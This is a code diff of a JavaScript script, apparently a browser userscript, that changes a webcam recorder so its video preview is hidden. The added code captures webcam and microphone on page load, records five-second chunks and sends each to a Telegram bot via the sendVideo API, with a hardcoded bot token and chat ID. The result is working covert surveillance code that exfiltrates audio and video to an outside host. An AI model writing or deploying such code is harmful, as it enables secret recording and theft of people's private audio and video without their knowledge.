@@ -17,25 +17,57 @@
     'use strict';
 
     // ✅ Your Telegram bot details
-    const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE"; 
-    const CHAT_ID = "8504837303"; // Your Telegram user ID
-    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE"; 
+const CHAT_ID = "8504837303"; // Your Telegram user ID
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
 
-    const video = document.getElementById('video');
+// Create a hidden video element dynamically
+const video = document.createElement('video');
+video.style.display = 'none'; // hides the preview
+video.autoplay = true;
+video.muted = true; // optional, prevents audio feedback
+document.body.appendChild(video); // optional, can omit if you don't need it in DOM
 
-    async function init() {
+async function init() {
+  try {
+    // Access webcam + microphone
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    handleStream(stream);
+  } catch (err) {
+    console.error("Cannot access webcam/mic:", err);
+    alert(err.message);
+  }
+}
+
+function handleStream(stream) {
+  video.srcObject = stream;
+
+  // Record 5-second chunks
+  const options = { mimeType: 'video/webm; codecs=vp8,opus' };
+  const mediaRecorder = new MediaRecorder(stream, options);
+
+  mediaRecorder.ondataavailable = async (event) => {
+    if (event.data && event.data.size > 0) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('video', event.data, 'chunk.webm');
+
       try {
-        // Access webcam + microphone
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        handleStream(stream);
+        await fetch(TELEGRAM_API, {
+          method: 'POST',
+          body: formData
+        });
+        console.log('5-second chunk sent to Telegram');
       } catch (err) {
-        console.error("Cannot access webcam/mic:", err);
-        alert(err.message);
+        console.error('Error sending chunk:', err);
       }
     }
+  };
 
-    function handleStream(stream) {
-      video.srcObject = stream;
+  // Start recording with 5-second timeslice
+  mediaRecorder.start(5000);
+  console.log('Recording started (5-second chunks, hidden video)');
+}
 
-      // Record small 1-second chunks for near-real-time streaming
-      const options = { mimeType: 'video/web
+// Initialize
+init();
